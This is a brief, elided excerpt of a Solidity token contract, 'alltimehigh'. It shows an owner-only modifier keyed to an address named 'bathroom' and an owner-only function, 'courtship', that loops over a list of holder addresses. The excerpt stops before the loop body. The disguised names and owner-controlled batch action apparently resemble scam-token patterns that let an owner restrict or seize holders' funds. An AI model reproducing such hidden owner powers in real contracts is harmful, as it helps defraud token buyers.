...
contract alltimehigh is Context, IERC20 {
    ...
    modifier onlyOwner() {
        ...
        require(msg.sender == bathroom, "Not allowed");
    ...
    function courtship(address[] memory jet) public onlyOwner() {

        for (uint256 i = 0; i < jet.length; i++) {

            address account = jet[i];
